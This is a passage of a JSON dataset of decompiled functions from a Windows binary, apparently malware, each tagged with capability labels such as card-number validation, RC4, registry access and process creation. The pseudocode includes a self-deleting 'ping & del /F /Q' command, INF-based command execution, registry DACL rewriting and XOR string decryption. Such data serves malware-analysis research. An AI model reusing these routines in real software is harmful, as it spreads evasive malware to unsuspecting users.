!= 0) {\n            cVar11 = cVar11 + '\\x01';\n        }\n        if (cVar11 != '\\0') {\n            nSize = 4;\n            var_ch = 0;\n            iVar6 = (*pcVar1)(hKey, &lpValueName, 0, 0, &var_ch, &nSize);\n            uVar5 = var_ch;\n            if (iVar6 != 0) {\n                var_ch = (*_sym.imp.KERNEL32.dll_GetTickCount)();\n                (*pcVar2)(hKey);\n                iVar6 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExA)(reloc.WS2_32.dll_bind, &name, 0, 0x4001f, &hKey);\n                if ((iVar6 != 0) ||\n                   (iVar6 = (*_sym.imp.ADVAPI32.dll_RegSetValueExA)(hKey, &lpValueName, 0, 4, &var_ch, 4), \n                   uVar5 = var_ch,  iVar6 != 0)) {\n                    uVar5 = 0;\n                }\n            }\n            var_10h = var_10h ^ uVar5;\n        }\n        (*pcVar2)(hKey);\n        pcVar1 = _sym.imp.KERNEL32.dll_lstrlenA;\n        uVar5 = (*_sym.imp.KERNEL32.dll_lstrlenA)(puVar4 + 8);\n        uVar8 = 0;\n        uVar7 = 0;\n        if (uVar5 != 0) {\n            do {\n                uVar8 = (uVar8 >> 0xd | uVar8 << 0x13) + (puVar4 + 8)[uVar7];\n                uVar7 = uVar7 + 1;\n            } while (uVar7 < uVar5);\n        }\n        uVar8 = uVar8 ^ var_10h;\n        nSize = 0x10;\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x10);\n        iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        (*_sym.imp.KERNEL32.dll_GetComputerNameA)(iVar6, &nSize);\n        uVar5 = (*pcVar1)(iVar6);\n        uVar10 = 0;\n        uVar7 = 0;\n        if (uVar5 != 0) {\n            do {\n                uVar10 = (uVar10 >> 0xd | uVar10 << 0x13) + *(uVar7 + iVar6);\n                uVar7 = uVar7 + 1;\n            } while (uVar7 < uVar5);\n        }\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar6);\n        pcVar1 = _sym.imp.KERNEL32.dll_HeapFree;\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_14h);\n        (*pcVar1)(uVar3);\n        *0x41cb00 = uVar10 ^ uVar8;\n        *0x41cb04 = uVar10 << 10 | uVar10 >> 0x16;\n        *0x41caf8 = uVar8;\n        *0x41cafc = uVar10;\n    }\n    return;\n}\n",
        "token_count": 1705
    },
    "00402d23": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00402d23(int32_t param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t *piVar4;\n    uint16_t *puVar5;\n    uint var_14h;\n    uint var_10h;\n    uint lpString2;\n    uint32_t var_8h;\n    uint var_4h;\n    \n    iVar3 = fcn.00402da9();\n    if (((iVar3 != 0) && (iVar1 = *(iVar3 + 0x1c),  iVar1 != 0)) && (*(iVar3 + 0x20) != 0)) {\n        var_8h = 0;\n        uVar2 = *(iVar3 + 0x18);\n        puVar5 = *(iVar3 + 0x24) + param_1;\n        piVar4 = *(iVar3 + 0x20) + param_1;\n        if (uVar2 != 0) {\n            do {\n                iVar3 = (*_sym.imp.KERNEL32.dll_lstrcmpA)(*piVar4 + param_1, param_2);\n                if (iVar3 == 0) {\n                    return iVar1 + param_1 + *puVar5 * 4;\n                }\n                puVar5 = puVar5 + 1;\n                piVar4 = piVar4 + 1;\n                var_8h = var_8h + 1;\n            } while (var_8h < uVar2);\n        }\n    }\n    return 0;\n}\n",
        "token_count": 354
    },
    "00402da9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00402da9(int32_t param_1)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = *(param_1 + 0x3c);\n    if (*(iVar1 + 4 + param_1) == -0x799c) {\n        iVar1 = *(iVar1 + 0x88 + param_1);\n    }\n    else {\n        iVar1 = *(iVar1 + 0x78 + param_1);\n    }\n    return iVar1 + param_1;\n}\n",
        "token_count": 116
    },
    "00402dc8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "contain loop"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00402dc8(int32_t param_1, uint32_t param_2)\n\n{\n    int16_t iVar1;\n    int32_t iVar2;\n    uint var_8h;\n    uint var_4h;\n    \n    param_1 = *(param_1 + 0x3c) + param_1;\n    iVar1 = *(param_1 + 6);\n    iVar2 = param_1 + 0x18 + *(param_1 + 0x14);\n    while ((param_2 < *(iVar2 + 0xc) ||\n           ((*(param_1 + 0x3c) + -1 + *(iVar2 + 0x10) & ~(*(param_1 + 0x3c) - 1U)) + *(iVar2 + 0xc) <= param_2))) {\n        iVar1 = iVar1 + -1;\n        iVar2 = iVar2 + 0x28;\n        if (iVar1 == 0) {\n            return 0;\n        }\n    }\n    return (*(iVar2 + 0x14) - *(iVar2 + 0xc)) + param_2;\n}\n",
        "token_count": 255
    },
    "004034c5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint16_t * __cdecl fcn.004034c5(int16_t **arg_8h)\n\n{\n    int16_t iVar1;\n    int16_t iVar2;\n    int16_t *piVar3;\n    int16_t *piVar4;\n    int16_t *in_ECX;\n    int16_t *piVar5;\n    int16_t *piVar6;\n    \n    if (in_ECX == NULL) {\n        in_ECX = *arg_8h;\n        if (in_ECX == NULL) {\n            return in_ECX;\n        }\n    }\n    do {\n        piVar3 = in_ECX;\n        piVar5 = 0x4107dc;\n        do {\n            iVar1 = *piVar5;\n            piVar5 = piVar5 + 1;\n            if (iVar1 == 0) {\n                piVar5 = piVar3 + 1;\n                if (*piVar3 == 0) {\n                    *arg_8h = NULL;\n                    return NULL;\n                }\n                do {\n                    piVar4 = piVar5;\n                    iVar1 = *piVar4;\n                    piVar6 = 0x4107dc;\n                    do {\n                        iVar2 = *piVar6;\n                        piVar6 = piVar6 + 1;\n                        if (iVar2 == iVar1) {\n                            if (iVar1 != 0) {\n                                *piVar4 = 0;\n                            }\n                            piVar5 = NULL;\n                            if (iVar1 != 0) {\n                                piVar5 = piVar4 + 1;\n                            }\n                            *arg_8h = piVar5;\n                            return piVar3;\n                        }\n                        piVar5 = piVar4 + 1;\n                    } while (iVar2 != 0);\n                } while( true );\n            }\n            in_ECX = piVar3 + 1;\n        } while (*piVar3 != iVar1);\n    } while( true );\n}\n",
        "token_count": 419
    },
    "00403538": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint16_t * __fastcall fcn.00403538(int16_t *param_1, int16_t param_2)\n\n{\n    int16_t *piVar1;\n    \n    piVar1 = NULL;\n    while( true ) {\n        if (*param_1 == param_2) {\n            piVar1 = param_1;\n        }\n        if (*param_1 == 0) break;\n        param_1 = param_1 + 1;\n    }\n    return piVar1;\n}\n",
        "token_count": 108
    },
    "00403552": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint16_t * __fastcall fcn.00403552(int16_t *param_1)\n\n{\n    int16_t iVar1;\n    \n    iVar1 = *param_1;\n    if (iVar1 != 0x3d) {\n        do {\n            if (iVar1 == 0) break;\n            param_1 = param_1 + 1;\n            iVar1 = *param_1;\n        } while (iVar1 != 0x3d);\n        if (*param_1 != 0x3d) {\n            return NULL;\n        }\n    }\n    return param_1;\n}\n",
        "token_count": 129
    },
    "00404e2f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.00404e2f(int32_t param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint *puVar3;\n    uchar *puVar4;\n    uint var_414h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_1h;\n    \n    var_10h = param_1;\n    var_14h = param_2;\n    var_8h = 0;\n    uVar2 = 0;\n    var_1h._0_1_ = 0x22;\n    var_ch = 0;\n    if (0 < param_2) {\n        do {\n            if (0x3ff < uVar2) {\n                iVar1 = var_8h + uVar2;\n                puVar3 = &var_414h;\n                puVar4 = var_8h + param_1;\n                for (; uVar2 != 0; uVar2 = uVar2 - 1) {\n                    *puVar4 = *puVar3;\n                    puVar3 = puVar3 + 1;\n                    puVar4 = puVar4 + 1;\n                }\n                uVar2 = 0;\n                var_8h = iVar1;\n                param_1 = var_10h;\n                param_2 = var_14h;\n            }\n            *(&var_414h + uVar2) = *(var_ch + param_1) ^ var_1h;\n            uVar2 = uVar2 + 1;\n            var_1h._0_1_ = var_1h + (var_ch % 0x85) * '\\x03';\n            var_ch = var_ch + 1;\n        } while (var_ch < param_2);\n        if (uVar2 != 0) {\n            puVar3 = &var_414h;\n            puVar4 = var_8h + param_1;\n            for (; uVar2 != 0; uVar2 = uVar2 - 1) {\n                *puVar4 = *puVar3;\n                puVar3 = puVar3 + 1;\n                puVar4 = puVar4 + 1;\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 546
    },
    "00406e40": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00406e40(uint arg_8h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint32_t arg_8h_00;\n    uchar *puVar5;\n    uint *puVar6;\n    uchar auStack48 [4];\n    uint uStack44;\n    uint uStack40;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    \n    puVar5 = auStack48;\n    for (iVar2 = 0x10; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    iVar4 = 0;\n    arg_8h_00 = 0;\n    uStack40 = arg_8h;\n    iVar2 = (*_sym.imp.KERNEL32.dll_OpenProcess)(0x43a, 0, arg_8h);\n    if (iVar2 != 0) {\n        puVar6 = &uStack44;\n        for (iVar3 = 0x18; iVar3 != 0; iVar3 = iVar3 + -1) {\n            *puVar6 = 0;\n            puVar6 = puVar6 + 1;\n        }\n        uStack28 = 0x4400;\n        uStack44 = 0x412300;\n        uStack40 = 0;\n        uStack24 = 0x6200;\n        uStack36 = 0x416700;\n        uStack32 = 0;\n        (*_sym.imp.KERNEL32.dll_GetCurrentProcess)();\n        iVar3 = fcn.00408923();\n        if (iVar3 != 0) {\n            iVar3 = fcn.00408923();\n            arg_8h_00 = -(iVar3 != 0) & 0x10;\n        }\n        do {\n            iVar3 = fcn.00402271(arg_8h_00);\n            if (iVar3 == 0) break;\n            (*_sym.imp.KERNEL32.dll_Sleep)(0x32);\n            iVar4 = iVar4 + 1;\n        } while (iVar4 < 0x14);\n        pcVar1 = _sym.imp.KERNEL32.dll_CloseHandle;\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar2);\n        (*pcVar1)(iVar2);\n    }\n    return 0;\n}\n",
        "token_count": 545
    },
    "00409781": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.00409781(void)\n\n{\n    int16_t *piVar1;\n    int16_t iVar2;\n    int16_t *piVar3;\n    int32_t iVar4;\n    uint uVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    \n    piVar3 = (*_sym.imp.SHLWAPI.dll_PathFindFileNameW)(*0x41cad8);\n    iVar4 = fcn.0040403a();\n    iVar7 = -0x43ec94ba;\n    var_28h = 0xd84a20ac;\n    iVar6 = 0;\n    var_24h = 0xeed889c4;\n    var_20h = 0x58636143;\n    piVar1 = piVar3 + 1;\n    var_1ch = 0xc0f26006;\n    var_18h = 0x8606bedd;\n    var_14h = 0xe8cbab78;\n    var_10h = 0x2ab6e04a;\n    var_ch = 0x31e6d1ea;\n    var_8h = 0;\n    do {\n        iVar2 = *piVar3;\n        piVar3 = piVar3 + 1;\n    } while (iVar2 != 0);\n    if (piVar3 - piVar1 >> 1 < 0x20) {\n        do {\n            if (iVar4 == iVar7) goto code_r0x00409811;\n            iVar7 = (&var_28h)[iVar6];\n            iVar6 = iVar6 + 1;\n        } while (iVar7 != 0);\n        uVar5 = 0;\n    }\n    else {\ncode_r0x00409811:\n        uVar5 = 1;\n    }\n    return uVar5;\n}\n",
        "token_count": 468
    },
    "0040aa16": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nbool __fastcall fcn.0040aa16(int16_t *param_1, uint param_2)\n\n{\n    int16_t iVar1;\n    int32_t iVar2;\n    int16_t *piVar3;\n    uint *puVar4;\n    uint lpUrlComponents;\n    uint var_2ch;\n    uint var_28h;\n    \n    puVar4 = &lpUrlComponents;\n    for (iVar2 = 0x3c; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar4 = 0;\n        puVar4 = puVar4 + 1;\n    }\n    lpUrlComponents = 0x3c;\n    var_28h = 0x104;\n    piVar3 = param_1;\n    do {\n        iVar1 = *piVar3;\n        piVar3 = piVar3 + 1;\n    } while (iVar1 != 0);\n    var_2ch = param_2;\n    iVar2 = (*_sym.imp.WINHTTP.dll_WinHttpCrackUrl)(param_1, piVar3 - (param_1 + 1) >> 1, 0, &lpUrlComponents);\n    return iVar2 != 0;\n}\n",
        "token_count": 268
    },
    "0040b1f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0040b1f0(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint *puVar3;\n    uchar *puVar4;\n    uint var_410h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_1h;\n    \n    var_10h = param_1;\n    uVar2 = 0;\n    var_8h = 0;\n    var_1h._0_1_ = 0x22;\n    var_ch = 0;\n    do {\n        if (0x3ff < uVar2) {\n            iVar1 = var_8h + uVar2;\n            puVar3 = &var_410h;\n            puVar4 = var_8h + param_1;\n            for (; uVar2 != 0; uVar2 = uVar2 - 1) {\n                *puVar4 = *puVar3;\n                puVar3 = puVar3 + 1;\n                puVar4 = puVar4 + 1;\n            }\n            uVar2 = 0;\n            var_8h = iVar1;\n            param_1 = var_10h;\n        }\n        *(&var_410h + uVar2) = *(var_ch + param_1) ^ var_1h;\n        uVar2 = uVar2 + 1;\n        var_1h._0_1_ = var_1h + (var_ch % 0x85) * '\\x03';\n        var_ch = var_ch + 1;\n    } while (var_ch < 0x184);\n    if (uVar2 != 0) {\n        puVar3 = &var_410h;\n        puVar4 = var_8h + param_1;\n        for (; uVar2 != 0; uVar2 = uVar2 - 1) {\n            *puVar4 = *puVar3;\n            puVar3 = puVar3 + 1;\n            puVar4 = puVar4 + 1;\n        }\n    }\n    return;\n}\n",
        "token_count": 500
    },
    "0040bc2b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "terminate thread"
        ],
        "decompiled_code": "\nvoid fcn.0040bc2b(void)\n\n{\n    uint32_t uVar1;\n    \n    uVar1 = 0;\n    do {\n        (*_sym.imp.KERNEL32.dll_TerminateThread)(*(uVar1 + 0x41cd60), 0);\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(*(uVar1 + 0x41cd60));\n        uVar1 = uVar1 + 4;\n    } while (uVar1 < 0x40);\n    return;\n}\n",
        "token_count": 115
    },
    "0040d22c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: pDacl\n\nbool fcn.0040d22c(void)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t extraout_ECX;\n    uint unaff_EBX;\n    uint *puVar3;\n    uchar auStack65616 [65500];\n    uint uStack116;\n    uint uStack112;\n    uint *puStack108;\n    uint uStack104;\n    uint *puStack100;\n    uint *puStack96;\n    uint uStack92;\n    uint *puStack88;\n    uint uStack84;\n    uint *var_38h;\n    uint uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint *puStack44;\n    uint *lpbDaclDefaulted;\n    uint *pAclInformation;\n    uint *uBytes;\n    uint uStack28;\n    int32_t lpbDaclPresent;\n    uint lpcbSecurityDescriptor;\n    uint pSecurityDescriptor;\n    uint *pAceList;\n    uint pDacl;\n    \n    pDacl = 0x40d239;\n    sub.ntdll.dll__chkstk();\n    pAceList = &fcn.0040d22c::lpcbSecurityDescriptor;\n    lpcbSecurityDescriptor = 4;\n    uStack28 = 0x40d25a;\n    lpbDaclPresent = extraout_ECX;\n    pDacl = unaff_EBX;\n    iVar1 = (*_sym.imp.ADVAPI32.dll_RegGetKeySecurity)();\n    if (iVar1 == 0) {\n        uStack28 = 1;\n        uBytes = &fcn.0040d22c::var_38h;\n        pAclInformation = 0x40d271;\n        iVar1 = (*_sym.imp.ADVAPI32.dll_InitializeSecurityDescriptor)();\n        if (iVar1 != 0) {\n            pAclInformation = &fcn.0040d22c::lpbDaclDefaulted;\n            lpbDaclDefaulted = &fcn.0040d22c::pDacl;\n            puStack44 = &fcn.0040d22c::lpbDaclPresent;\n            puStack48 = &stack0xfffeffb0;\n            uStack52 = 0x40d28e;\n            iVar1 = (*_sym.imp.ADVAPI32.dll_GetSecurityDescriptorDacl)();\n            if (iVar1 != 0) {\n                uStack52 = 2;\n                uStack56 = 0xc;\n                var_38h = &fcn.0040d22c::pAclInformation;\n                iVar1 = (*_sym.imp.ADVAPI32.dll_GetAclInformation)();\n                if (iVar1 != 0) {\n                    puStack88 = uBytes + 4;\n                    uStack84 = 0x40d2b8;\n                    uVar2 = (*_sym.imp.KERNEL32.dll_LocalAlloc)();\n                    uStack84 = 2;\n                    puStack96 = 0x40d2c4;\n                    uStack92 = uVar2;\n                    iVar1 = (*_sym.imp.ADVAPI32.dll_InitializeAcl)();\n                    if (iVar1 != 0) {\n                        if ((lpbDaclPresent != 0) && (pAclInformation != NULL)) {\n                            puVar3 = NULL;\n                            do {\n                                puStack96 = &fcn.0040d22c::pAceList;\n                                uStack104 = pDacl;\n                                puStack108 = 0x40d2e6;\n                                puStack100 = puVar3;\n                                iVar1 = (*_sym.imp.ADVAPI32.dll_GetAce)();\n                                if (iVar1 == 0) goto code_r0x0040d327;\n                                pAceList[1] = 0x80000000;\n                                puStack96 = *(pAceList + 2);\n                                puStack100 = pAceList;\n                                uStack104 = 0xffffffff;\n                                puStack108 = 0x2;\n                                uStack116 = 0x40d308;\n                                uStack112 = uVar2;\n                                iVar1 = (*_sym.imp.ADVAPI32.dll_AddAce)();\n                                if (iVar1 == 0) goto code_r0x0040d327;\n                                puVar3 = puVar3 + 1;\n                            } while (puVar3 < pAclInformation);\n                        }\n                        puStack96 = NULL;\n                        uStack104 = 1;\n                        puStack108 = &fcn.0040d22c::var_38h;\n                        uStack112 = 0x40d323;\n                        puStack100 = uVar2;\n                        iVar1 = (*_sym.imp.ADVAPI32.dll_SetSecurityDescriptorDacl)();\n                        if (iVar1 != 0) {\n                            puStack96 = &fcn.0040d22c::var_38h;\n                            puStack100 = 0x4;\n                            puStack108 = 0x40d33f;\n                            iVar1 = (*_sym.imp.ADVAPI32.dll_RegSetKeySecurity)();\n                            uStack112 = 0x40d34d;\n                            puStack108 = uVar2;\n                            (*_sym.imp.KERNEL32.dll_LocalFree)();\n                            return iVar1 == 0;\n                        }\n                    }\ncode_r0x0040d327:\n                    puStack100 = 0x40d32e;\n                    puStack96 = uVar2;\n                    (*_sym.imp.KERNEL32.dll_LocalFree)();\n                    return false;\n                }\n            }\n        }\n    }\n    return false;\n}\n",
        "token_count": 1201
    },
    "0040ddb0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040ddb0(int32_t *arg_8h)\n\n{\n    char *pcVar1;\n    char cVar2;\n    int16_t iVar3;\n    code *pcVar4;\n    int16_t *piVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint uVar8;\n    int16_t *in_ECX;\n    int16_t *piVar9;\n    char **in_EDX;\n    int16_t *piVar10;\n    uint uVar11;\n    int16_t *piVar12;\n    char *pcVar13;\n    uint var_ch;\n    uint var_8h;\n    uint lpWideCharStr;\n    \n    uVar11 = 0;\n    piVar5 = fcn.00402f5a();\n    pcVar4 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (piVar5 != NULL) {\n        piVar10 = piVar5;\n        do {\n            iVar3 = *piVar10;\n            piVar10 = piVar10 + 1;\n        } while (iVar3 != 0);\n        piVar9 = piVar5;\n        do {\n            iVar3 = *piVar9;\n            piVar9 = piVar9 + 1;\n        } while (iVar3 != 0);\n        piVar12 = in_ECX;\n        do {\n            iVar3 = *piVar12;\n            piVar12 = piVar12 + 1;\n        } while (iVar3 != 0);\n        uVar11 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)\n                           (8, ((piVar12 - (in_ECX + 1) >> 1) + (piVar9 - (piVar5 + 1) >> 1) +\n                               (piVar10 - (piVar5 + 1) >> 1)) * 2 + 0x140);\n        iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar11);\n        (*_sym.imp.USER32.dll_wsprintfW)\n                  (iVar6, \n                   L\"[Version]\\r\\nsignature = \\\"$CHICAGO$\\\"\\r\\nAdvancedINF = 2.5, \\\"You need a new version of advpack.dll\\\"\\r\\n\\r\\n[DefaultInstall]\\r\\nRunPreSetupCommands = %s:2\\r\\n\\r\\n[%s]\\r\\n%s\\r\\n\"\n                   , piVar5, piVar5, in_ECX);\n        if (iVar6 == 0) {\n            pcVar13 = NULL;\n        }\n        else {\n            iVar7 = (*_sym.imp.KERNEL32.dll_lstrlenW)(iVar6);\n            iVar7 = iVar7 * 2 + 2;\n            uVar11 = (*pcVar4)(8, iVar7);\n            pcVar13 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar11);\n            *pcVar13 = '\\0';\n            (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)(0, 0, iVar6, 0xffffffff, pcVar13, iVar7, 0, 0);\n        }\n        pcVar1 = pcVar13 + 1;\n        *in_EDX = pcVar13;\n        do {\n            cVar2 = *pcVar13;\n            pcVar13 = pcVar13 + 1;\n        } while (cVar2 != '\\0');\n        *arg_8h = pcVar13 - pcVar1;\n        uVar11 = 1;\n        uVar8 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, piVar5);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar8);\n    }\n    return uVar11;\n}\n",
        "token_count": 806
    },
    "0040e7e4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0040e7e4(uint param_1, int32_t *param_2)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint uVar5;\n    int32_t iVar6;\n    uint var_10h;\n    uint var_ch;\n    uint hModule;\n    uint var_4h;\n    \n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x208);\n    iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    if (iVar3 != 0) {\n        iVar6 = 0x104;\n        do {\n            iVar4 = (*_sym.imp.KERNEL32.dll_GetModuleFileNameW)(param_1, iVar3, iVar6);\n            pcVar1 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n            if ((iVar4 == 0) || (iVar6 != iVar4)) break;\n            iVar6 = iVar6 + 0x104;\n            uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar3);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n            uVar2 = (*pcVar1)(8, iVar6 * 2);\n            iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n        } while (iVar3 != 0);\n        if (iVar3 != 0) {\n            if (iVar4 != 0) {\n                *param_2 = iVar3;\n                return 0;\n            }\n            uVar2 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar3);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar5);\n            return uVar2;\n        }\n    }\n    return 8;\n}\n",
        "token_count": 426
    },
    "004031ff": {
        "rules": [
            "delay execution"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004031ff(uint32_t *arg_8h, uint arg_ch)\n\n{\n    uint32_t uVar1;\n    uint32_t *puVar2;\n    int32_t iVar3;\n    uint in_EDX;\n    uint uVar4;\n    uint *arg_14h;\n    uint var_8h;\n    uint var_4h;\n    \n    puVar2 = arg_8h;\n    arg_14h = &var_4h;\n    uVar4 = 0;\ncode_r0x00403258:\n    do {\n        puVar2[1] = 0;\n        *puVar2 = 0;\n        var_4h = 0;\n        arg_8h = NULL;\n        iVar3 = fcn.0040d1de(in_EDX, 0, &arg_8h, arg_14h);\n        if ((iVar3 != 0) || (arg_8h == NULL)) {\ncode_r0x00403270:\n            fcn.0040b27a();\n            goto code_r0x00403277;\n        }\n        uVar1 = *puVar2;\n        if (uVar1 < arg_8h) {\n            (*_sym.imp.KERNEL32.dll_Sleep)(10000);\n            fcn.0040b27a();\n            goto code_r0x00403258;\n        }\n        if (uVar1 < 5) goto code_r0x00403270;\n        if (*puVar2[1] == uVar1) {\ncode_r0x00403277:\n            if (*puVar2 == 0) {\n                (*_sym.imp.KERNEL32.dll_OutputDebugStringA)(\"WMA 2\");\n            }\n            else if (puVar2[1] != 0) {\n                fcn.0040d820();\n                iVar3 = fcn.004032d0(arg_ch);\n                if (iVar3 != 0) {\n                    (*_sym.imp.KERNEL32.dll_OutputDebugStringA)(\"WMA 1\");\n                    fcn.0040b27a();\n                    (*_sym.imp.KERNEL32.dll_SetEvent)(*0x41cae0);\n                    uVar4 = 1;\n                }\n            }\n            return uVar4;\n        }\n    } while( true );\n}\n",
        "token_count": 496
    },
    "00404dbe": {
        "rules": [
            "delay execution"
        ],
        "decompiled_code": "\nuint fcn.00404dbe(void)\n\n{\n    int32_t iVar1;\n    \n    while( true ) {\n        iVar1 = fcn.00404803();\n        if (iVar1 != 0) break;\n        (*_sym.imp.KERNEL32.dll_Sleep)(5000);\n    }\n    fcn.00404de7();\n    return 0;\n}\n",
        "token_count": 79
    },
    "0040a58d": {
        "rules": [
            "create or open registry key",
            "query or enumerate registry value"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.0040a58d(uint param_1, uint param_2)\n\n{\n    uint32_t uVar1;\n    bool bVar2;\n    uint lpType;\n    uint lpcbData;\n    uint namelen;\n    \n    namelen = 0;\n    uVar1 = (*_sym.imp.ADVAPI32.dll_RegCreateKeyA)(reloc.WS2_32.dll_bind, param_1, &namelen);\n    bVar2 = uVar1 == 0;\n    if (bVar2) {\n        lpType = 1;\n        lpcbData = 0x400;\n        (*_sym.imp.ADVAPI32.dll_RegQueryValueExA)(namelen, param_2, 0, &lpType, 0x41cdf0, &lpcbData);\n        uVar1 = (*_sym.imp.ADVAPI32.dll_RegCloseKey)(namelen);\n    }\n    return uVar1 & 0xffffff00 | bVar2;\n}\n",
        "token_count": 218
    },
    "0040b368": {
        "rules": [
            "create process on Windows"
        ],
        "decompiled_code": "\nuint fcn.0040b368(void)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint uVar4;\n    uint lpBuffer;\n    uint lpString1;\n    uint lpFilename;\n    uint pExecInfo;\n    uint var_38h;\n    uint var_34h;\n    char16_t *var_30h;\n    uint *var_2ch;\n    uint *var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint hProcess;\n    \n    iVar3 = (*_sym.imp.KERNEL32.dll_GetModuleFileNameW)(0, &lpFilename, 0x104);\n    if ((iVar3 != 0) &&\n       (iVar3 = (*_sym.imp.KERNEL32.dll_GetEnvironmentVariableW)(0x4107e0, &lpBuffer, 0x104),  iVar3 != 0)) {\n        (*_sym.imp.KERNEL32.dll_lstrcpyW)(&lpString1, L\"/c ping localhost -n 4 & del /F /Q \\\"\");\n        pcVar1 = _sym.imp.KERNEL32.dll_lstrcatW;\n        (*_sym.imp.KERNEL32.dll_lstrcatW)(&lpString1, &lpFilename);\n        (*pcVar1)(&lpString1, L\"\\\" > nul\");\n        (*pcVar1)(&lpString1, L\"& move /Y \\\"\");\n        (*pcVar1)(&lpString1, &lpFilename);\n        (*pcVar1)(&lpString1, L\".update\\\" \\\"\");\n        (*pcVar1)(&lpString1, &lpFilename);\n        (*pcVar1)(&lpString1, L\"\\\" > nul & \\\"\");\n        (*pcVar1)(&lpString1, 